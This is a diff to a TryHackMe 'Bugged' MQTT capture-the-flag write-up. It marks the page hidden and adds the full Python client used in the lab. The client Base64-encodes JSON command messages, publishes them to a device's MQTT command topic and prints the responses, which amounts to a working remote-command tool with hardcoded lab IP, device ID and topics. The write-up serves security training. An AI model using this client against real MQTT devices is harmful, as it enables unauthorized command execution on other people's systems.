@@ -1,5 +1,6 @@
 ---
 description: An evidence-based walkthrough of the TryHackMe Bugged MQTT challenge.
+hidden: true
 ---
 
 # Bugged Write-up
@@ -174,6 +175,272 @@ The client:
 * Waits for a response with a configurable timeout.
 
 The supplied screenshot shows the custom client receiving the `flag.txt` directory-listing result and the flag response. It also shows the Base64 configuration decode in CyberChef.
+
+The following source implements the client used during the lab:
+
+```python
+import argparse as _argparse
+import base64 as _base64
+import binascii as _binascii
+import json as _json
+import queue as _queue
+import threading as _threading
+import time as _time
+
+import paho.mqtt.client as _mqtt
+
+
+_RESET = "\033[0m"
+_BOLD = "\033[1m"
+_CYAN = "\033[96m"
+_GREEN = "\033[92m"
+_YELLOW = "\033[93m"
+_RED = "\033[91m"
+_GRAY = "\033[90m"
+
+_ID = "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"
+
+_CMD_TOPIC = "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
+_RESP_TOPIC = "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"
+
+_responses = _queue.Queue()
+_connected = _threading.Event()
+_subscribed = _threading.Event()
+_state = {"error": None}
+
+
+def _banner():
+    print(f"""
+{_CYAN}{_BOLD}
+    ╔══════════════════════════════════════╗
+    ║           MQTT COMMAND CLIENT        ║
+    ╚══════════════════════════════════════╝
+{_RESET}{_GRAY}    Type a command to send it to the target.
+    Type 'exit' or 'quit' to disconnect.
+{_RESET}""")
+
+
+def _payload_generator(_id, _method, _command):
+    _data = {
+        "id": _id,
+        "cmd": _method,
+        "arg": _command,
+    }
+
+    _json_bytes = _json.dumps(_data).encode("utf-8")
+    return _base64.b64encode(_json_bytes).decode("ascii")
+
+
+def _decode_response(_payload):
+    _raw = _payload.decode("utf-8", errors="replace").strip()
+
+    try:
+        _decoded = _base64.b64decode(
+            _raw,
+            validate=True,
+        ).decode("utf-8", errors="replace")
+    except (_binascii.Error, ValueError):
+        _decoded = _raw
+
+    try:
+        return _json.loads(_decoded)
+    except _json.JSONDecodeError:
+        return {"response": _decoded}
+
+
+def _on_connect(_client, _userdata, _flags, _reason_code, _properties):
+    if _reason_code.is_failure:
+        _state["error"] = str(_reason_code)
+        _connected.set()
+        return
+
+    _result, _mid = _client.subscribe(
+        _args.response_topic
+    )
+
+    if _result != _mqtt.MQTT_ERR_SUCCESS:
+        _state["error"] = "Failed to subscribe to response topic."
+
+    _connected.set()
+
+
+def _on_subscribe(
+    _client,
+    _userdata,
+    _mid,
+    _reason_code_list,
+    _properties,
+):
+    if any(_code.is_failure for _code in _reason_code_list):
+        _state["error"] = "Broker rejected the subscription."
+
+    _subscribed.set()
+
+
+def _on_message(_client, _userdata, _message):
+    _responses.put(_decode_response(_message.payload))
+
+
+def _print_response(_message):
+    _response = (
+        _message.get("response", _message)
+        if isinstance(_message, dict)
+        else _message
+    )
+
+    print(f"{_GREEN}{_BOLD}Response:{_RESET}")
+
+    if isinstance(_response, (dict, list)):
+        print(_json.dumps(_response, indent=2, ensure_ascii=False))
+    else:
+        print(str(_response).rstrip())
+
+
+def _send_command(_client, _command):
+    while not _responses.empty():
+        try:
+            _responses.get_nowait()
+        except _queue.Empty:
+            break
+
+    _payload = _payload_generator(
+        _args.id,
+        "CMD",
+        _command,
+    )
+
+    _info = _client.publish(
+        _args.command_topic,
+        _payload,
+        qos=0,
+    )
+
+    if _info.rc != _mqtt.MQTT_ERR_SUCCESS:
+        print(f"{_RED}[!] Failed to publish command.{_RESET}")
+        return
+
+    print(f"{_GRAY}[*] Waiting for response...{_RESET}")
+
+    _deadline = _time.monotonic() + _args.timeout
+
+    while True:
+        _remaining = _deadline - _time.monotonic()
+
+        if _remaining <= 0:
+            print(f"{_YELLOW}[!] Response timeout.{_RESET}")
+            return
+
+        try:
+            _message = _responses.get(timeout=_remaining)
+        except _queue.Empty:
+            print(f"{_YELLOW}[!] Response timeout.{_RESET}")
+            return
+
+        if isinstance(_message, dict):
+            _response_id = _message.get("id")
+
+            if _response_id not in (None, _args.id):
+                continue
+
+        _print_response(_message)
+        return
+
+
+def _main():
+    global _args
+
+    _parser = _argparse.ArgumentParser(
+        description="Interactive MQTT command client."
+    )
+
+    _parser.add_argument(
+        "--ip",
+        default="10.113.140.34",
+        help="MQTT broker IP address",
+    )
+    _parser.add_argument("--port", type=int, default=1883)
+    _parser.add_argument("--id", default=_ID)
+    _parser.add_argument(
+        "--command-topic",
+        default=_CMD_TOPIC,
+    )
+    _parser.add_argument(
+        "--response-topic",
+        default=_RESP_TOPIC,
+    )
+    _parser.add_argument(
+        "--timeout",
+        type=float,
+        default=10.0,
+        help="Response timeout in seconds",
+    )
+
+    _args = _parser.parse_args()
+
+    _banner()
+
+    _client = _mqtt.Client(
+        callback_api_version=_mqtt.CallbackAPIVersion.VERSION2
+    )
+
+    _client.on_connect = _on_connect
+    _client.on_subscribe = _on_subscribe
+    _client.on_message = _on_message
+
+    try:
+        _client.connect(_args.ip, _args.port, keepalive=30)
+        _client.loop_start()
+
+        if not _connected.wait(timeout=8):
+            raise TimeoutError("Connection timed out.")
+
+        if _state["error"]:
+            raise ConnectionError(_state["error"])
+
+        if not _subscribed.wait(timeout=8):
+            raise TimeoutError("Subscription timed out.")
+
+        if _state["error"]:
+            raise ConnectionError(_state["error"])
+
+        print(f"{_GREEN}[+] Connected to {_args.ip}:{_args.port}{_RESET}")
+        print(f"{_GRAY}[*] Command topic:  {_args.command_topic}")
+        print(f"[*] Response topic: {_args.response_topic}{_RESET}\n")
+
+        while True:
+            try:
+                _command = input(
+                    f"{_BOLD}{_CYAN}mqtt> {_RESET}"
+                ).strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                break
+
+            if not _command:
+                continue
+
+            if _command.lower() in {"exit", "quit"}:
+                break
+
+            if _command.lower() == "clear":
+                print("\033[2J\033[H", end="")
+                _banner()
+                continue
+
+            _send_command(_client, _command)
+
+    except (OSError, TimeoutError, ConnectionError) as _error:
+        print(f"{_RED}[!] {_error}{_RESET}")
+
+    finally:
+        _client.disconnect()
+        _client.loop_stop()
+        print(f"\n{_GRAY}[*] Disconnected.{_RESET}")
+
+
+if __name__ == "__main__":
+    _main()
+```
 
 ### Flag retrieval
 
